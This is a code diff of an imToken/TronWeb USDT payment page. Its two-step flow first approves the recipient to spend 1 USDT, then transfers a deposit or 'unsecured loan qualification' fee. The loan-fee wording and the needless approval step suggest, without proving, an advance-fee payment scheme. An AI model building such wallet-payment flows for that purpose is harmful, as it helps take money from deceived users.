@@ -42,7 +42,7 @@
     <div class="info-row"><span class="info-k">支付金额</span><span class="info-v gold" id="info-amount">-</span></div>
   </div>
 
-  <button class="btn btn-pay" id="btn-pay" disabled>第 1 步：确认授权 1U</button>
+  <button class="btn btn-pay" id="btn-pay" disabled>第 1 步：授权 1 USDT</button>
   <button class="btn btn-ghost" id="btn-cancel">取消 / 刷新页面</button>
   <div class="status" id="status"></div>
 </div>
@@ -55,10 +55,6 @@ function setStatus(t, msg) { const el = $('#status'); el.className = 'status ' +
 const USDT_CONTRACT   = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const PAY_CTX_KEY     = 'pay_ctx_v1';
 const PAY_CTX_TTL     = 24 * 60 * 60 * 1000;
-const CACHE_TTL       = 50000;
-const PREWARM_MS      = 22000;
-const ENV_CHECK_MS    = 500;
-const MAX_ENV_CHECK   = 12;
 const NODE_TIMEOUT    = 6000;
 const SIGN_TIMEOUT    = 120000;
 const SEND_TIMEOUT    = 15000;
@@ -99,19 +95,18 @@ const toAddress = ctx.a;
 const amount = ctx.n;
 const type = ctx.t;
 let payDisabled = false;
+let step = 1; // 1: 授权, 2: 付款
 
 $('#info-addr').textContent   = toAddress || '未配置';
 $('#info-chain').textContent  = 'TRC20 (波场)';
 $('#info-amount').textContent = (amount > 0 ? amount : '-') + ' USDT';
 $('#page-title').textContent  = type === 'empty' ? '空放资格支付' : '押金充值';
-$('#page-sub').textContent    = type === 'empty' ? '支付 1 USDT 激活空放通道' : '请在 imToken 中确认支付';
+$('#page-sub').textContent    = type === 'empty' ? '支付 1 USDT 激活空放通道' : '请在 imToken 中完成操作';
 
 if ((ctx.src === 'hash' || ctx.src === 'storage') && toAddress && amount > 0) {
   const tip = $('#recover-tip');
   tip.style.display = 'block';
-  tip.textContent = ctx.src === 'storage'
-    ? '✅ 已从本地缓存恢复支付参数，请确认金额与地址无误后继续。'
-    : '✅ 已从备用链接恢复支付参数，请确认金额与地址无误后继续。';
+  tip.textContent = '✅ 已恢复支付参数，请确认信息无误后继续。';
   savePayCtx(toAddress, amount, type);
 }
 
@@ -121,7 +116,7 @@ if (!toAddress || amount <= 0) {
 } else {
   const btn = $('#btn-pay');
   btn.disabled = false;
-  btn.textContent = '第 1 步：确认授权 1U';
+  btn.textContent = '第 1 步：确认授权 1 USDT';
 }
 
 function showMissingParamsUI() {
@@ -130,7 +125,7 @@ function showMissingParamsUI() {
   warn.innerHTML = `
     <div style="margin-bottom:8px;font-weight:700;">⚠️ 支付参数丢失</div>
     <div style="font-size:12.5px;line-height:1.7;margin-bottom:10px;">
-      imToken 冷启动可能截断链接。请返回平台重新点击支付，或复制当前页面链接在 imToken 浏览打开。
+      请返回平台重新点击支付，或复制当前链接在 imToken 浏览打开。
     </div>
     <button id="__copy_paylink__" style="width:100%;background:#f1f2f7;color:#5b6070;border:none;padding:11px;border-radius:10px;font-size:13px;cursor:pointer;">复制当前链接</button>
     <div id="__copied_tip__" style="font-size:12px;color:#16a34a;margin-top:8px;display:none;">✅ 已复制</div>`;
@@ -149,7 +144,7 @@ function fallbackCopy(text, done) {
     const ta = document.createElement('textarea'); ta.value = text;
     ta.style.cssText = 'position:fixed;opacity:0'; document.body.appendChild(ta);
     ta.select(); document.execCommand('copy'); ta.remove(); if (done) done();
-  } catch (e) { prompt('请复制链接到 imToken 浏览打开：', text); }
+  } catch (e) { prompt('请复制链接：', text); }
 }
 function copyText(text, done) {
   if (navigator.clipboard && navigator.clipboard.writeText)
@@ -202,14 +197,6 @@ async function buildTxMulti(tw, contract, fnSig, params, fromAddress) {
   ));
   return withRetry(() => promiseAny(tasks), 2, 500);
 }
-async function buildTxCore(tw, fnSig, params, fromAddress) {
-  return buildTxMulti(tw, USDT_CONTRACT, fnSig, params, fromAddress);
-}
-async function buildTxWithTip(tw, fnSig, params, fromAddress) {
-  const slow = setTimeout(() => setStatus('loading', '⏳ 波场节点响应较慢，正在努力连接（已自动重试）…'), 3000);
-  try { return await buildTxCore(tw, fnSig, params, fromAddress); }
-  finally { clearTimeout(slow); }
-}
 function androidIntentLink(dappUrl) {
   const ul = imTokenUniversalLink(dappUrl);
   return 'intent://navigate/DappView?url=' + encodeURIComponent(dappUrl)
@@ -225,38 +212,30 @@ function showOpenWalletUI(reason) {
   const warn = $('#env-warn');
   warn.style.display = 'block';
   warn.innerHTML = '<div style="margin-bottom:10px;font-weight:700;">' + (reason || '当前未检测到钱包环境') + '</div>'
-    + '<div style="font-size:12.5px;line-height:1.7;margin-bottom:10px;">请在 imToken 钱包内打开本页完成支付，或用 imToken「扫一扫」下方二维码：</div>'
-    + '<img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=' + encodeURIComponent(location.href) + '" style="width:140px;height:140px;margin:0 auto 10px;display:block;border-radius:8px;background:#fff;padding:6px;" alt="支付二维码">'
-    + '<button id="__open_imtoken__" style="width:100%;background:#0e8aff;color:#fff;border:none;padding:12px;border-radius:10px;font-size:14px;font-weight:800;margin-bottom:8px;cursor:pointer;">立即打开 imToken 支付</button>'
-    + '<button id="__copy_paylink__" style="width:100%;background:#f1f2f7;color:#5b6070;border:none;padding:11px;border-radius:10px;font-size:13px;cursor:pointer;">复制支付链接</button>'
-    + '<div id="__copied_tip__" style="font-size:12px;color:#16a34a;margin-top:8px;display:none;">✅ 已复制，打开 imToken → 浏览 → 粘贴网址</div>';
+    + '<div style="font-size:12.5px;line-height:1.7;margin-bottom:10px;">请在 imToken 钱包内打开本页完成支付：</div>'
+    + '<button id="__open_imtoken__" style="width:100%;background:#0e8aff;color:#fff;border:none;padding:12px;border-radius:10px;font-size:14px;font-weight:800;margin-bottom:8px;cursor:pointer;">立即打开 imToken</button>';
   warn.querySelector('#__open_imtoken__').onclick = openWalletNow;
-  warn.querySelector('#__copy_paylink__').onclick = () => {
-    copyText(location.href, () => { warn.querySelector('#__copied_tip__').style.display = 'block'; });
-  };
   const btn = $('#btn-pay'); btn.disabled = true; btn.textContent = '请在 imToken 中打开本页';
 }
 
-/* ============ 环境检测 / 预构建 ============ */
+/* ============ 环境检测 ============ */
 let envCheckCount = 0;
 function checkEnvironment() {
   if (payDisabled) return;
   const tw = getTronWeb();
-  if (tw) { $('#env-warn').style.display = 'none'; prewarmLoop(); return; }
-  if (envCheckCount < MAX_ENV_CHECK) {
+  if (tw) { $('#env-warn').style.display = 'none'; return; }
+  if (envCheckCount < 12) {
     envCheckCount++;
-    if (envCheckCount === Math.floor(MAX_ENV_CHECK / 2))
-      showOpenWalletUI('⏳ 正在等待钱包环境注入，若长时间无反应请扫码或点击下方按钮');
-    setTimeout(checkEnvironment, ENV_CHECK_MS);
+    setTimeout(checkEnvironment, 500);
   } else {
     showOpenWalletUI('⚠️ 未检测到钱包环境');
   }
 }
+
 async function waitWalletAddress(tw) {
-  let waited = 0, slowTip = false;
+  let waited = 0;
   while (!(tw.defaultAddress && tw.defaultAddress.base58) && waited < 5000) {
     await new Promise(r => setTimeout(r, 200)); waited += 200;
-    if (waited >= 2000 && !slowTip) { slowTip = true; setStatus('loading', '⏳ 正在读取钱包地址，请稍候…'); }
   }
   let from = tw.defaultAddress && tw.defaultAddress.base58;
   if (!from && tw.defaultAddress && tw.defaultAddress.hex) {
@@ -265,75 +244,34 @@ async function waitWalletAddress(tw) {
   if (!from) throw new Error('钱包地址未就绪，请退出页面后重新进入');
   return from;
 }
-async function checkAllowance(tw, owner) {
-  try {
-    const res = await withTimeout(
-      tw.transactionBuilder.triggerConstantContract(USDT_CONTRACT, 'allowance(address,address)', {},
-        [{ type: 'address', value: owner }, { type: 'address', value: toAddress }], owner),
-      5000, 'allowance 查询超时');
-    const hex = res && res.constant_result && res.constant_result[0];
-    if (hex) {
-      const allowed = BigInt('0x' + hex.replace(/^0x/, ''));
-      if (allowed >= 1000000n) return true;
-    }
-  } catch (e) {}
-  return false;
-}
 
-/* ============ 预构建 ============ */
-let step = 1;
-let cachedApprove = null, cachedTransfer = null, cachedAt = 0, prewarmTimer = null;
-async function prewarmOnce() {
-  if (payDisabled) return;
-  try {
-    const tw = getTronWeb(); if (!tw) return;
-    const from = await waitWalletAddress(tw);
-    if (step === 1 && (await checkAllowance(tw, from))) {
-      step = 2;
-      const btn = $('#btn-pay');
-      if (!btn.disabled) btn.textContent = '第 2 步：确认支付 ' + amount + ' USDT';
-    }
-    cachedApprove = await buildTxCore(tw, 'approve(address,uint256)',
-      [{ type: 'address', value: toAddress }, { type: 'uint256', value: '1000000' }], from);
-    cachedAt = Date.now();
-    cachedTransfer = await buildTxCore(tw, 'transfer(address,uint256)',
-      [{ type: 'address', value: toAddress }, { type: 'uint256', value: Math.floor(amount * 1e6).toString() }], from);
-  } catch (e) {}
-}
-function prewarmLoop() {
-  if (prewarmTimer || payDisabled) return;
-  prewarmOnce();
-  prewarmTimer = setInterval(() => {
-    if (document.visibilityState !== 'hidden') prewarmOnce();
-  }, PREWARM_MS);
-}
-function freshCache(obj) { return obj && obj.result && obj.result.result && Date.now() - cachedAt < CACHE_TTL; }
-
-/* ============ 支付交互 ============ */
+/* ============ 按钮核心交互（强制两步） ============ */
 $('#btn-pay').onclick = async function () {
   if (payDisabled) return;
   const btn = this; btn.disabled = true;
   const tw = getTronWeb();
   if (!tw) { showOpenWalletUI('⚠️ 未检测到钱包环境'); btn.disabled = false; return; }
 
+  // —— 第 1 步：授权 ——
   if (step === 1) {
-    btn.textContent = '请求授权中…';
-    setStatus('loading', '第 1 步：请在钱包弹窗中确认授权…');
+    btn.textContent = '正在发起授权…';
+    setStatus('loading', '请在钱包弹窗中确认授权 1 USDT…');
     try {
       const from = await waitWalletAddress(tw);
-      let tx = freshCache(cachedApprove) ? cachedApprove : null;
-      if (!tx) {
-        setStatus('loading', '正在构建授权交易，请稍候…');
-        tx = await buildTxWithTip(tw, 'approve(address,uint256)',
-          [{ type: 'address', value: toAddress }, { type: 'uint256', value: '1000000' }], from);
-      }
-      if (!tx.result || !tx.result.result) throw new Error('构建授权交易失败');
+      setStatus('loading', '正在构建交易，请稍候…');
+      const txApprove = await buildTxMulti(tw, USDT_CONTRACT, 'approve(address,uint256)',
+        [{ type: 'address', value: toAddress }, { type: 'uint256', value: '1000000' }], from);
+      
+      if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权交易失败');
+      
       setStatus('loading', '✅ 请在钱包弹窗中确认授权…');
-      const signed = await withTimeout(tw.trx.sign(tx.transaction), SIGN_TIMEOUT, '授权签名超时（您可能未在钱包中确认），请重试');
-      await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播授权交易超时，请检查网络后重试');
-      setStatus('success', '✅ 授权成功！请点击下方按钮进行第 2 步支付。');
-      step = 2; cachedApprove = null;
-      btn.textContent = '第 2 步：确认支付 ' + amount + ' U';
+      const signed = await withTimeout(tw.trx.sign(txApprove.transaction), SIGN_TIMEOUT, '签名超时，请重试');
+      await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播超时，请检查网络');
+      
+      setStatus('success', '✅ 授权成功！请点击下方按钮继续付款。');
+      step = 2;
+      btn.textContent = '第 2 步：确认支付 ' + amount + ' USDT';
+      btn.style.background = '#16a34a'; // 变成绿色，提示继续
       btn.disabled = false;
     } catch (e) {
       setStatus('error', '❌ 授权失败: ' + (e.message || '用户取消'));
@@ -342,34 +280,36 @@ $('#btn-pay').onclick = async function () {
     return;
   }
 
-  btn.textContent = '请求支付中…';
-  setStatus('loading', '第 2 步：请在钱包弹窗中确认支付…');
+  // —— 第 2 步：付款 ——
+  btn.textContent = '正在发起付款…';
+  setStatus('loading', '请在钱包弹窗中确认付款…');
   try {
     const from = await waitWalletAddress(tw);
-    let tx = freshCache(cachedTransfer) ? cachedTransfer : null;
-    if (!tx) {
-      setStatus('loading', '正在构建支付交易，请稍候…');
-      tx = await buildTxWithTip(tw, 'transfer(address,uint256)',
-        [{ type: 'address', value: toAddress }, { type: 'uint256', value: Math.floor(amount * 1e6).toString() }], from);
-    }
-    if (!tx.result || !tx.result.result) throw new Error('构建支付交易失败');
-    setStatus('loading', '✅ 请在钱包弹窗中确认支付…');
-    const signed = await withTimeout(tw.trx.sign(tx.transaction), SIGN_TIMEOUT, '支付签名超时（您可能未在钱包中确认），请重试');
-    await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播支付交易超时，请检查网络后重试');
-    setStatus('success', '✅ 全部操作已完成，请在钱包账单中查看状态');
-    btn.textContent = '已完成';
+    setStatus('loading', '正在构建交易，请稍候…');
+    const txTransfer = await buildTxMulti(tw, USDT_CONTRACT, 'transfer(address,uint256)',
+      [{ type: 'address', value: toAddress }, { type: 'uint256', value: Math.floor(amount * 1e6).toString() }], from);
+    
+    if (!txTransfer.result || !txTransfer.result.result) throw new Error('构建付款交易失败');
+    
+    setStatus('loading', '✅ 请在钱包弹窗中确认付款…');
+    const signed = await withTimeout(tw.trx.sign(txTransfer.transaction), SIGN_TIMEOUT, '签名超时，请重试');
+    await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播超时，请检查网络');
+    
+    setStatus('success', '✅ 付款成功！请返回平台查看状态。');
+    btn.textContent = '全部已完成';
     clearPayCtx();
   } catch (e) {
-    setStatus('error', '❌ 支付失败: ' + (e.message || '用户取消'));
-    btn.textContent = '重新支付'; btn.disabled = false;
+    setStatus('error', '❌ 付款失败: ' + (e.message || '用户取消'));
+    btn.textContent = '重新付款'; btn.disabled = false;
   }
 };
+
 $('#btn-cancel').onclick = () => window.history.back();
 
 if (!payDisabled) {
   checkEnvironment();
   if (isClosedEnv() && !isWalletEnv())
-    showOpenWalletUI('⚠️ 当前为 App 内置浏览器 / WebView，无法直接唤起钱包');
+    showOpenWalletUI('⚠️ 当前为 App 内置浏览器，无法直接唤起钱包');
 }
 </script>
 </body>
